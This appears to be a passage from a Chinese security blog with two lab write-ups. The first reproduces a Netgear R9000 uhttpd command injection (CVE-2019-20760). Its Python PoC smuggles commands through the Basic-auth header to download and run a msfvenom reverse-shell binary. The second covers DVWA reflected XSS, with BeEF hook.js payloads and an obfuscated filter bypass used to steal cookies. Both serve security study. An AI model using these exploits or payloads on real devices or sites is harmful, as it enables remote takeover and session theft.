    <title>Netgear-CVE-2019-20760</title>
    <url>/2023/10/05/Netgear-CVE-2019-20760/</url>
    <content><![CDATA[<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><ul>
<li><strong>漏洞服务：</strong> <code>uhttpd</code></li>
<li><strong>漏洞类型：</strong> 远程命令执行</li>
<li><strong>影响范围：</strong> 1.0.4.26之前的NETGEAR R9000设备会受到身份验证绕过的影响</li>
<li><strong>解决建议：</strong> 更新版本</li>
</ul>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ul>
<li><strong>操作环境：</strong> ubuntu:22.04</li>
<li><strong>qemu-version：</strong> 8.1.1</li>
</ul>
<h3 id="仿真环境"><a href="#仿真环境" class="headerlink" title="仿真环境"></a>仿真环境</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://www.downloads.netgear.com/files/GDC/R9000/R9000-V1.0.4.26.zip</span><br></pre></td></tr></table></figure></div>

<p>下载固件。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">binwalk -Mer R9000-V1.0.4.26.img </span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006204853421.png"
                      alt="image-20231006204853421"
                ></p>
<p>可通过 <code>binwalk</code> 常规解压获得文件系统。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006213813263.png"
                      alt="image-20231006213813263"
                ></p>
<p>检查 <code>ELF32</code> 文件架构为 <code>arm-32-little</code>。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://file.erlkonig.tech/debian-armhf/wheezy/debian_wheezy_armhf_standard.qcow2</span><br><span class="line">wget https://file.erlkonig.tech/debian-armhf/wheezy/initrd.img-3.2.0-4-vexpress</span><br><span class="line">wget https://file.erlkonig.tech/debian-armhf/wheezy/vmlinuz-3.2.0-4-vexpress</span><br></pre></td></tr></table></figure></div>

<p>下载合适的虚拟机映像。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">参考《CTF实战》by ChaMd5</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">&#x27;ens33&#x27;</span>: The NIC is that can connect internet</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">sudo ifconfig eth0 down                 <span class="comment"># 首先关闭宿主机网卡接口</span></span></span><br><span class="line">sudo brctl addbr br0                     # 添加一座名为 br0 的网桥</span><br><span class="line">sudo brctl addif br0 ens33               # 在 br0 中添加一个接口</span><br><span class="line">sudo brctl stp br0 off                   # 如果只有一个网桥，则关闭生成树协议</span><br><span class="line">sudo brctl setfd br0 1                   # 设置 br0 的转发延迟</span><br><span class="line">sudo brctl sethello br0 1                # 设置 br0 的 hello 时间</span><br><span class="line">sudo ifconfig br0 0.0.0.0 promisc up     # 启用 br0 接口</span><br><span class="line">sudo ifconfig ens33 0.0.0.0 promisc up   # 启用网卡接口</span><br><span class="line">sudo dhclient br0                        # 从 dhcp 服务器获得 br0 的 IP 地址</span><br><span class="line">sudo brctl show br0                      # 查看虚拟网桥列表</span><br><span class="line">sudo brctl showstp br0                   # 查看 br0 的各接口信息</span><br><span class="line">sudo tunctl -t tap0 -u root              # 创建一个 tap0 接口，只允许 root 用户访问</span><br><span class="line">sudo brctl addif br0 tap0                # 在虚拟网桥中增加一个 tap0 接口</span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up    # 启用 tap0 接口</span><br><span class="line">sudo brctl showstp br0</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006215529022.png"
                      alt="image-20231006215529022"
                ></p>
<p>配置网络。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">qemu-system-arm \</span><br><span class="line">    -M vexpress-a9 \</span><br><span class="line">    -kernel vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">    -initrd initrd.img-3.2.0-4-vexpress \</span><br><span class="line">    -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">    -append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; \</span><br><span class="line">    -net nic -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">-M              			# 选择开发板​</span><br><span class="line">-m							# 指定内存大小</span><br><span class="line">-drive         			    # 定义存储驱动器​</span><br><span class="line">file=         			    # 定义镜像文件​</span><br><span class="line">-net nic       			    # 创建客户机网卡​</span><br><span class="line">-net tap                    # 创建 tap 设备，以桥接方式跟宿主机通信​</span><br><span class="line">ifname=virtual0             # tap 设备与名为 virtual0 的虚拟网卡进行桥接通信​</span><br><span class="line">-nographic                  # 以非图形化模式启动​</span><br><span class="line">-append        			    # 内核启动附加参数​</span><br><span class="line">-console=ttyAMA0		    # console指向串口，有此启动参数，内核启动日志才能输出到宿主机终端</span><br><span class="line">-nographic					# 不再启用额外的终端界面</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006220307746.png"
                      alt="image-20231006220307746"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006220609818.png"
                      alt="image-20231006220609818"
                ></p>
<p>启动 <code>qemu-system-armhf</code> 环境，默认用户名密码都为 <code>root</code>。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ifconfig eth0 192.168.152.168/24</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006220912835.png"
                      alt="image-20231006220912835"
                ></p>
<p>为 <code>qemu-system-armhf</code> 配置静态 <code>IP</code>。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">tar -cvf squashfs-root.tar.gz squashfs-root/</span><br><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006221335309.png"
                      alt="image-20231006221335309"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006221428854.png"
                      alt="image-20231006221428854"
                ></p>
<p>将文件根系统打包，然后利用 <code>python3</code> 的 <code>http.server</code> 模块下载到 <code>qemu-system-armhf</code>  的根目录中并用 <code>tar xvf squashfs-root.tar.gz </code> 解压。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd /squashfs-root</span><br><span class="line">mount --bind /proc proc # proc目录是一个虚拟文件系统，可以为linux用户空间和内核空间提供交互</span><br><span class="line">mount --bind /dev dev   # /dev/下的设备是通过创建设备节点生成的，用户通过此设备节点来访问内核里的驱动</span><br><span class="line">chroot . sh</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006222713410.png"
                      alt="image-20231006222713410"
                ></p>
<p>因为 <code>chroot</code> 会导致无法在隔离的文件系统中访问原本的 <code>/proc</code>和  <code>/dev</code> 目录，这里利用 <code>mount</code> 命令将 <code>qemu-system-armhf</code>  的 <code>proc</code> 和 <code>dev</code> 目录挂在到 <code>squashfs-root</code> 中，并更换根目录为 <code>squashfs-root</code>。</p>
<h3 id="Web模拟"><a href="#Web模拟" class="headerlink" title="Web模拟"></a>Web模拟</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">find -name uhttpd</span><br><span class="line">cat ./etc/init.d/uhttpd</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">./etc/init.d/uhttpd</span></span><br><span class="line">...</span><br><span class="line">start() &#123;</span><br><span class="line"><span class="meta prompt_">	#</span><span class="language-bash">config_load uhttpd</span></span><br><span class="line"><span class="meta prompt_">	#</span><span class="language-bash">config_foreach start_instance uhttpd</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">	#</span><span class="language-bash"><span class="built_in">mkdir</span> /tmp/www</span></span><br><span class="line"><span class="meta prompt_">	#</span><span class="language-bash"><span class="built_in">cp</span> -rf /usr/www/* /tmp/www</span></span><br><span class="line"></span><br><span class="line">	/www/cgi-bin/uhttpd.sh start</span><br><span class="line">	inetd</span><br><span class="line">	detplc</span><br><span class="line">    #for bug58012</span><br><span class="line">    touch /tmp/fwcheck_status</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>

<p>查找 <code>uhttpd</code> 的相关文件。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">REALM=`/bin/cat /module_name | sed &#x27;s/\n//g&#x27;`</span><br><span class="line">UHTTPD_BIN=&quot;/usr/sbin/uhttpd&quot;</span><br><span class="line">PX5G_BIN=&quot;/usr/sbin/px5g&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uhttpd_stop()</span><br><span class="line">&#123;</span><br><span class="line">	kill -9 $(pidof uhttpd)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uhttpd_start()</span><br><span class="line">&#123;</span><br><span class="line">        $UHTTPD_BIN -h /www -r $&#123;REALM&#125;  -x /cgi-bin -t 70 -p 0.0.0.0:80 -C /etc/uhttpd.crt -K /etc/uhttpd.key -s 0.0.0.0:443</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">case &quot;$1&quot; in</span><br><span class="line">	stop)</span><br><span class="line">		uhttpd_stop</span><br><span class="line">	;;</span><br><span class="line">	start)</span><br><span class="line">		uhttpd_start</span><br><span class="line">	;;</span><br><span class="line">	restart)</span><br><span class="line">		uhttpd_stop</span><br><span class="line">		uhttpd_start</span><br><span class="line">	;;</span><br><span class="line">	*)</span><br><span class="line">		logger -- &quot;usage: $0 start|stop|restart&quot;</span><br><span class="line">	;;</span><br><span class="line">esac</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006223655990.png"
                      alt="image-20231006223655990"
                ></p>
<p>查看 <code>start()</code> 函数中利用的 <code>/www/cgi-bin/uhttpd.sh</code> 脚本。发现启动命令为 <code>$UHTTPD_BIN -h /www -r $&#123;REALM&#125;  -x /cgi-bin -t 70 -p 0.0.0.0:80 -C /etc/uhttpd.crt -K /etc/uhttpd.key -s 0.0.0.0:443</code> 其中 <code>REALM = R9000</code> ，<code>UHTTPD_BIN = /usr/sbin/uhttpd</code>。我们无需开启 <code>https</code>，所以启动命令为 <code>/usr/sbin/uhttpd -h /www -r R9000 -x /cgi-bin -t 70 -p 0.0.0.0:80</code>。</p>
<h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://www.downloads.netgear.com/files/GDC/R9000/R9000-V1.0.4.28.zip</span><br></pre></td></tr></table></figure></div>

<p>获取修复版本的固件。因为源码较为繁杂，我们通过 <code>Bindiff</code> 进行二进制比对，来查找漏洞点。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006231411605.png"
                      alt="image-20231006231411605"
                ></p>
<p><code>shift+D</code> 选取修复版本的 <code>/usr/sbin/uhttpd</code> 文件即可，主要查看登录验证的 <code>uh_cgi_auth_check()</code> 函数。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x1000</span>u);</span><br><span class="line">  v14 = <span class="built_in">strlen</span>(v13);</span><br><span class="line">  <span class="built_in">uh_b64decode</span>(s, <span class="number">0xFFF</span>, v13 + <span class="number">6</span>, v14 - <span class="number">6</span>);</span><br><span class="line">  v15 = <span class="built_in">strchr</span>(s, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v15 )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_32:</span><br><span class="line">    v16 = <span class="number">0</span>;</span><br><span class="line">    v17 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  &#125;</span><br><span class="line">  v16 = v15 + <span class="number">1</span>;</span><br><span class="line">  *v15 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v15 != (<span class="type">char</span> *)<span class="number">0xFFFFFFFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">snprintf</span>(command, <span class="number">0x80</span>u, <span class="string">&quot;/usr/sbin/hash-data -e %s &gt;/tmp/hash_result&quot;</span>, v15 + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">system</span>(command);</span><br><span class="line">    v3 = <span class="built_in">cat_file</span>(<span class="number">73805</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v17 = s</span><br></pre></td></tr></table></figure></div>

<p>漏洞版本 <code>base64</code> 解密后 <code>snprintf()</code> 后直接传给 <code>system()</code> 执行，这里会把 <code>v15(:)</code>后面的内容放到 <code>%s</code> 处，记得加<code>\n</code>来执行多条指令。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x1000</span>u);</span><br><span class="line">  v15 = <span class="built_in">strlen</span>(v14);</span><br><span class="line">  <span class="built_in">uh_b64decode</span>(s, <span class="number">4095</span>, v14 + <span class="number">6</span>, v15 - <span class="number">6</span>);</span><br><span class="line">  v16 = <span class="built_in">strchr</span>(s, <span class="number">58</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v16 )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_15:</span><br><span class="line">    v17 = <span class="number">0</span>;</span><br><span class="line">    v18 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">  &#125;</span><br><span class="line">  v17 = v16 + <span class="number">1</span>;</span><br><span class="line">  *v16 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v16 != (<span class="type">char</span> *)<span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = s;</span><br><span class="line">    <span class="built_in">dni_system</span>(<span class="string">&quot;/tmp/hash_result&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;/usr/sbin/hash-data&quot;</span>, <span class="string">&quot;-e&quot;</span>, v17, <span class="number">0</span>);</span><br><span class="line">    v19 = <span class="built_in">cat_file</span>(<span class="string">&quot;/tmp/hash_result&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>而修复版本则利用 <code>dni_system()</code> 执行，只可控参数。</p>
<h3 id="获取权限"><a href="#获取权限" class="headerlink" title="获取权限"></a>获取权限</h3><p>poc:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">cmd  = <span class="string">&#x27;admin:&#x27;</span></span><br><span class="line">cmd += <span class="string">&#x27;`&#x27;</span></span><br><span class="line">cmd += <span class="string">&#x27;wget http://192.168.152.167:8000/shell.elf\n&#x27;</span></span><br><span class="line">cmd += <span class="string">&#x27;chmod 777 ./shell.elf\n&#x27;</span></span><br><span class="line">cmd += <span class="string">&#x27;./shell.elf\n&#x27;</span></span><br><span class="line">cmd += <span class="string">&#x27;`&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(cmd) &lt; <span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">cmd_b64 = base64.b64encode(cmd.encode()).decode()</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;Basic &quot;</span> + cmd_b64</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.get(<span class="string">&quot;http://192.168.152.168/cgi-bin/&quot;</span>, headers=headers, timeout=<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">attack()</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/armle/shell_reverse_tcp LHOST=192.168.152.167 LPORT=10086 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure></div>

<p>利用 <code>msf</code> 生成对应架构的木马程序，然后在<code>shell.elf</code>所在的目录开启<code>http</code>服务，利用漏洞将木马程序下载下来。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006233741185.png"
                      alt="image-20231006233741185"
                ></p>
<p>启动监听，并执行 <code>exp.py</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006234357194.png"
                      alt="image-20231006234357194"
                ></p>
<p>成功获取 <code>shell</code>，我们利用获取的权限在 <code>www</code> 目录创建 <code>flag.txt</code> 文件然后访问它。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006234709504.png"
                      alt="image-20231006234709504"
                ></p>
<p>成功创建。</p>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT-CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全-XSS跨站脚本攻击</title>
    <url>/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>XSS 指 Web 应用代码注入，攻击者向 Web 页面插入恶意 Script 代码，例如 JavaScript 脚本，CSS 或者其他代码。用户浏览该页面会执行其中嵌入的 Script 代码，从而获取 cookie，session，token或其他敏感信息，对用户进行钓鱼欺诈。</p>
<h2 id="XSS-基础"><a href="#XSS-基础" class="headerlink" title="XSS 基础"></a>XSS 基础</h2><h3 id="反射型-XSS（非持久性-XSS）"><a href="#反射型-XSS（非持久性-XSS）" class="headerlink" title="反射型 XSS（非持久性 XSS）"></a>反射型 XSS（非持久性 XSS）</h3><p>这种 XSS 并没有保存到目标网站，而是将将恶意代码放在请求的响应结果中，浏览器解析后触发 XSS，一般引诱用户点击恶意链接来实施攻击。</p>
<h5 id="dvwa-例题"><a href="#dvwa-例题" class="headerlink" title="dvwa 例题:"></a>dvwa 例题:</h5><p><strong>level: Low</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123;</span><br><span class="line">    // Feedback for end user</span><br><span class="line">    echo &#x27;&lt;pre&gt;Hello &#x27; . $_GET[ &#x27;name&#x27; ] . &#x27;&lt;/pre&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>向 GET 请求注入代码:</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line">127.0.0.1/DVWA/vulnerabilities/xss_r/?name=&lt;script&gt;alert(&quot;hello&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&quot;hello&quot;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230926211545402.png"
                      alt="image-20230926211545402"
                ></p>
<p>反馈:</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230926211722779.png"
                      alt="image-20230926211722779"
                ></p>
<p>BeEF 利用:</p>
<p>攻击方 <code>IP: 192.168.152.128</code>。</p>
<p>靶场<code>IP: 192.168.152.1</code></p>
<p>键入<code>&lt;script src=&quot;http://192.168.152.128:3000/hook.js&quot;&gt;&lt;/script&gt;</code></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927145547349.png"
                      alt="image-20230927145547349"
                ></p>
<p>反馈:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927145700059.png"
                      alt="image-20230927145700059"
                ></p>
<p><code>URL: http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=%3Cscript+src%3D%22http%3A%2F%2F192.168.152.128%3A3000%2Fhook.js%22%3E%3C%2Fscript%3E#</code></p>
<p>变成了  hook.js地址，并且成功上线 BeEF，可通过Get cookie 获取 cookie信息。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927145747630.png"
                      alt="image-20230927145747630"
                ></p>
<p>界面跳转。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927160822193.png"
                      alt="image-20230927160822193"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927160901116.png"
                      alt="image-20230927160901116"
                ></p>
<p>弹窗。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927161904804.png"
                      alt="image-20230927161904804"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927161847107.png"
                      alt="image-20230927161847107"
                ></p>
<p><strong>level: Medium</strong></p>
<p>源码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header (&quot;X-XSS-Protection: 0&quot;);</span><br><span class="line">// Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123;</span><br><span class="line">	// Get input</span><br><span class="line">	$name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] );//str_replace 区分大小写。</span><br><span class="line"></span><br><span class="line">	// Feedback for end user</span><br><span class="line">	$html .= &quot;&lt;pre&gt;Hello &#123;$name&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>payload:</p>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.152.128:3000/hook.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Script</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927165007670.png"
                      alt="image-20230927165007670"
                ></p>
<p><strong>level: High</strong></p>
<p>源码:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header (&quot;X-XSS-Protection: 0&quot;);</span><br><span class="line">// Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123;</span><br><span class="line">	// Get input</span><br><span class="line">	$name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] );</span><br><span class="line">    // 避开&lt;script ,*贪婪匹配会匹配到 &lt;</span><br><span class="line"></span><br><span class="line">	// Feedback for end user</span><br><span class="line">	$html .= &quot;&lt;pre&gt;Hello &#123;$name&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>只要避免 <code>script</code>出现即可。</p>
<p>策略: 使用<code>String.fromCharCode()</code>函数来创建<code>&quot;script&quot;</code>和<code>&quot;http://192.168.152.128:3000/hook.js&quot;</code>这两个字符串，以避免直接在代码中出现这些字符串。然后，我使用<code>eval()</code>函数来执行这段代码。</p>
<p>payload:</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;nonexistent.jpg&quot;</span> onerror=<span class="string">&quot;eval(&#x27;var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src=String.fromCharCode(104,116,116,112,58,47,47,49,57,50,46,49,54,56,46,49,53,50,46,49,50,56,58,51,48,48,48,47,104,111,111,107,46,106,115);document.head.appendChild(s);&#x27;)&quot;</span>&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927171112316.png"
                      alt="image-20230927171112316"
                ></p>
<p> 成功上线BeEF。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
